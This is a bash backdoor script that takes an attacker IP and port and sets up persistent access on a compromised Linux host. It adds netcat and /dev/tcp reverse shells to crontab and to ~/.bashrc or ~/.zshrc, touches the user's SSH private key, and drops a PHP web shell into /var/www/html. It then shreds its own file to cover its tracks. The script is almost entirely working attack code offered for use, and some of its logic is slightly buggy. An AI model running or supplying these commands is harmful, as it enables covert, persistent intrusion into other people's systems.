#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
ENDCOLOR="\e[0m"

$_REQUEST="$_REQUEST"

if [ -z $1 ]
then
	echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
    exit 1
fi

if [ -z $2 ]
then
    echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
    exit 1
fi


echo -e "\n${YELLOW}[+] 1. CRONTAB${ENDCOLOR}"
echo -e "Injecting Code..."

{ crontab -l; echo "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"; } | crontab - > /dev/null 2>&1
{ crontab -l; echo "* * * * * bash -i >& /dev/tcp/$1/$2 0>&1"; } | crontab - > /dev/null 2>&1
crontab -l | grep '* * * * * rm /tmp/f;mkfifo /tmp/f;cat' > /dev/null 2>&1


a=$(echo $?)
if [[ $a =~ 0 ]]
then
   echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
fi

echo -e "\n${YELLOW}[+] 2. SHELL CONFIG FILE${ENDCOLOR}"
echo -e "Injecting Code..."
ps -p $$ > /dev/shm/.tmp
cat /dev/shm/.tmp | grep "bash" > /dev/null 2>&1

a2=$(echo $?)
if [[ $a2 =~ 0 ]]
then
	echo "bash -i >& /dev/tcp/$1/$2 0>&1" >> ~/.bashrc
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f" >> ~/.bashrc
	cat ~/.bashrc | grep "bash -i >& /dev/tcp" > /dev/null 2>&1
	a3=$(echo $?)
	if [[ $a3 =~ 0 ]]
	then
   		echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
	fi
fi

if [[ $a2 =~ 1 ]]
then
        echo "bash -i >& /dev/tcp/$1/$2 0>&1" >> ~/.zshrc
	cat ~/.zshrc | grep "bash -i >& /dev/tcp" > /dev/null 2>&1
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f" >> ~/.zshrc
        a3=$(echo $?)
        if [[ $a3 =~ 0 ]]
        then
                echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
        fi
fi

echo -e "\n${YELLOW}[+] 3. SSH PRIVATE KEY${ENDCOLOR}"
cat ~/.ssh/id_rsa > /dev/null 2>&1

echo -e "\n${YELLOW}[+] 4. WEB SERVER${ENDCOLOR}"
echo -e "Searching Web Server..."

curl http://localhost > /dev/null 2>&1
a4=$(echo $?)
if [[ $a =~ 0 ]]
then
   echo -e "${GREEN}[+] WEB SERVER DETECTED${ENDCOLOR}"
   echo "<?php echo shell_exec(\$_REQUEST['cmd']);?>" > /var/www/html/sh.php
   echo -e "Injecting Code..."
   echo -e "${GREEN}[+] RCE:${ENDCOLOR}"
   echo -e "http://localhost/sh.php?cmd=id"
fi


shred -zvu -n 5 /dev/shm/.tmp > /dev/null 2>&1
shred -zvu -n 5 b4ckdoor.sh > /dev/null 2>&1
